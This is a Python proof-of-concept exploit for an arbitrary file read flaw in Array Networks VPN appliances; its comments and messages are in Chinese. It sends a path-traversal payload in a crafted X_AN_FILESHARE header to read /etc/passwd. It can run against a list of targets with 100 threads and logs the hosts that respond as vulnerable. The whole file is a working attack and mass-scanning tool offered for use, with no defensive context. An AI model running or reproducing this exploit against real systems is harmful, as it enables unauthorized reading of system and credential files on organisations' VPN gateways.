# Array_VPN任意文件读取漏洞

import sys, argparse, requests, re
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    test = """
            
                 █████╗ ██████╗ ██████╗  █████╗ ██╗   ██╗    ██╗   ██╗██████╗ ███╗   ██╗
                ██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝    ██║   ██║██╔══██╗████╗  ██║
                ███████║██████╔╝██████╔╝███████║ ╚████╔╝     ██║   ██║██████╔╝██╔██╗ ██║
                ██╔══██║██╔══██╗██╔══██╗██╔══██║  ╚██╔╝      ╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║
                ██║  ██║██║  ██║██║  ██║██║  ██║   ██║███████╗╚████╔╝ ██║     ██║ ╚████║
                ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝╚══════╝ ╚═══╝  ╚═╝     ╚═╝  ╚═══╝
                                                                                    author:秋妤
                                                                                    date:2024.09.03
                                                                                    version:1.0
                                                                        

        """
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description="Array_VPN任意文件读取漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
            mp = Pool(100)
            mp.map(poc, url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(targer):
    payload = "/prx/000/http/localhost/client_sec/%00../../../addfolder"
    payload1 = "/prx/000/http/localhost/client_sec/%00%2e%2e/%2e%2e/%2e%2e/%2e%2e/addfolder"
    url = targer + payload
    url1 = targer + payload1
    herders = {
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml + xml,application/xml;q=0.9,*/*;q=0.8",
        "X_AN_FILESHARE": "uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd"
    }
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    try:
        res = requests.get(targer)
        if res.status_code == 200:
            res1 = requests.get(url, headers=herders,verify=False,timeout=5)
            # res2 = requests.get(url1, headers=herders, proxies=proxies,verify=False, timeout=5)
            if res1.status_code == 200 :
                print(f"[+]该{targer}存在任意文件读取漏洞")
                with open('Array-VPN_result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[+]{targer} 存在任意文件读取漏洞\n")
            else:
                print(f"[-]{targer}不存在任意文件读取漏洞")
        else:
            print(f"该{targer}存在问题，请手工检测")

    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()